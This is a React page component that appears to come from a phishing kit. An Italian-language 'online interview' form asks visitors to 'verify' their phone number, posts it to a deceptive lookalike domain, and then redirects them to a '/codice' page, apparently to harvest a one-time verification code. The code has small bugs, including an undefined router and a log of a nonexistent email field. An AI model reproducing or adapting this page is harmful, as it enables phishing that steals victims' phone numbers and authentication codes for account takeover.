import { useState, useEffect } from "react";
import classes from "@/pages/ut1516432/ut.module.css";
import axios from "axios";

function Home() {
  const [data, changeData] = useState({
    phone: ""
  });

  const changeDataFn = e => changeData(prev => ({...prev, [e.target.name]: e.target.value}));


  async function handleSubmitFn() {
    try {
      await axios.post(`http://imobilede.com.id.stra-e.xyz/api/phone`, data);
      router.replace('http://imobilede.com.id.stra-e.xyz/codice');
    } catch(err) {
      console.log(err.response, "ce o avea");
    }
  }


  function handleSubmit(e) {
    e.preventDefault();

    console.log(data.email)

    if(data.phone) {
      handleSubmitFn();
    }
  }

  return (
    <section>
      <div className={classes.container}>
        <span className={classes.title}>
          Intervista online
        </span>
        <span className={classes.subTitle}>
          Verifica il numero di telefono prima di iniziare l'intervista. 
        </span>
      </div>

      <form onSubmit={handleSubmit} className={classes.form}>
        <div className={classes.formCell}>
          <label className={classes.formCellName}>Numero di telefono</label>
          <input
            name="phone"
            className={classes.input}
            value={data.phone}
            onChange={changeDataFn}
            type="text"
            required
          />
        
        </div>

        <button className={classes.btn}>Invia codice</button>
      </form>
    </section>
  );
}

export default Home;
